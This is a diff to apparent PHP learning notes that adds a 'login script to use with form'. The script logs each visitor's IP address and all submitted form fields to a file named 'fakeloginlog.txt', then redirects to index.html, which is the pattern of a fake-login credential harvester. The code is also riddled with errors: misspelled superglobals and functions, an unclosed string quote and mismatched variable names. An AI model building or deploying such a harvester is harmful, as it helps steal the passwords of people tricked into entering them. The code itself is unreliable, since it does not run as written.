@@ -1,6 +1,6 @@
 1. Our first hello world
 2. Our First form
-
+3. PHP login script to use with form. 
 
 
 1. Dependancies and lessons: 
@@ -55,3 +55,21 @@ What we did learn is that PHP comments need to be between <?php and ?> or else i
 
      </form>
 </body></html>
+
+
+3.
+<?php
+// Get Client IP
+if (!empty($_SEVER['HTTP_CLIENT_IP'])) { $ip_address = $_SERVER['HTTP_CLIENT_IP]; }
+elseif ( !emptpy($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip_address = $_SERVER['HTTP_X_FORWADED_FOR']; }
+else { $ip_address = $_SERVER['REMOTE_ADDR']; }
+
+// Get POST data
+$data= json_encoded($_POST);
+
+//Log entry
+$logentry = date("Y-m-d G:i:s")." - ".$ip_addresss." - ".$data;
+file_put_contents("fakeloginlog.txt",$logentry.PHP_EOL, FILE_APPEND | LOCK_EX);
+header('Location: ./index.html');
+exit;
+?>
